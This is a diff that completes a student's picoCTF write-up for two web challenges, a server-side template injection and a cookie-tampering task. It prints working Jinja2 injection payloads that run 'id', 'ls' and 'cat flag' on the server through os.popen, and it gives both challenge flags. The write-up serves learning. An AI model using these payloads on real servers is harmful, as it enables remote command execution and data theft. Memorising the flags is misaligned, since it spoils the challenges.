@@ -102,70 +102,90 @@ I heard templating is a cool and modular way to build web apps! Check out my web
 It displays back whatever I input in the field
 ![screenshot of webpage output ](./Screenshots/WebExp_Challenge2_output.jpg)
 
-2.Upond doing some research on SSTI(Server-Side Template Injection)
+2.Upon doing some research on SSTI(Server-Side Template Injection),I give a prompt
 ```
-put codes & terminal outputs here using triple backticks
+{{'a'+'b'}}
+```
+The output is
+![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
 
-you may also use ```python for python codes for example
+3.To confirm that this is Jinja 2 and that we can run commands,I give the input
 ```
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+and we get the output
+![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
+
+4.Now that we have confirmed our suspicions we can check the files present in the directory using
+```
+{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+```
+![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
+
+5.Upon opening the file present in the directory we get the flag,we use the input
+```
+{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+```
+![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
+
 
 ## Flag:
 
 ```
-picoCTF{}
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}
 ```
 
 ## Concepts learnt:
 
-- Include the new topics you've come across and explain them in brief
-- 
+- Polyglot Payloads: You learn how to use simple expressions, often called polyglot payloads (e.g., {{ 7 * 7 }} or {{ 'a' + 'b' }}), to test for the vulnerability. If the result is the computed answer (49 or ab) instead of the raw text, the server is executing the input.
+- Engine Fingerprinting: learnt how identify the specific template engine (Jinja2, Twig, ERB, etc.) to successfully exploit the vulnerability. This is often done by observing how the engine handles unique syntax or operations.
 
-## Notes:
-
-- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
-- 
 
 ## Resources:
 
-- Include the resources you've referred to with links. [example hyperlink](https://google.com)
+- Testing for Server-side Template Injection(https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
+- Server-side template injection(https://portswigger.net/web-security/server-side-template-injection)
 
 
 ***
 
 # 3. Cookies
 
-> Put in the challenge's description here
+Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/
 
 ## Solution:
 
-- Include as many steps as you can with your thought process
-- You **must** include images such as screenshots wherever relevant.
+1.The link takes us to a webpage with a input box and a button.
+![screenshot of webpage output ](./Screenshots/WebExp_Challenge3_mainpage.jpg)
 
-```
-put codes & terminal outputs here using triple backticks
+2.I open the developer tab and go to the cookies tab and see one cookie named 'name' with value -1
+![screenshot of webpage output ](./Screenshots/WebExp_Challenge3_cookies.jpg)
 
-you may also use ```python for python codes for example
-```
+3.I input 'snickerdoodle' and the page gives a response and the value in the cookie 'name' changes to 0
+![screenshot of webpage output ](./Screenshots/WebExp_Challenge3_snickerdoodle.jpg)
+
+4.I look up most famous cookies and try entering the top 10 names.I input 'Chocolate chip' and the value in the cookie 'name' changes to 1.
+![screenshot of webpage output ](./Screenshots/WebExp_Challenge3_chocolatechip.jpg)
+
+5.From this process I conclude that different values of the cookie 'name' will result in different cookie names at the output.Now we just need to cycle through numbers till we get some information to move forward.I got lucky and found the flag when i changed value of cookie 'name' to 18
+
 
 ## Flag:
 
 ```
-picoCTF{}
+picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
 ```
 
 ## Concepts learnt:
 
-- Include the new topics you've come across and explain them in brief
-- 
+- Client-Side Data Storage: Learned that web applications use cookies to store user-specific data on the client's browser. This data is sent back to the server with every request.
+- Cookie Manipulation: Understood that if an application relies solely on an unvalidated cookie value (like name) to determine content, an attacker can manipulate that value to access unauthorized data.
 
-## Notes:
 
-- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
-- 
 
 ## Resources:
 
-- Include the resources you've referred to with links. [example hyperlink](https://google.com)
-
+- Cookie Management (Browser Developer Tools)
+- Understanding Cookies in Web Browsers(https://www.geeksforgeeks.org/websites-apps/understanding-cookies-in-web-browsers/)
 
 ***
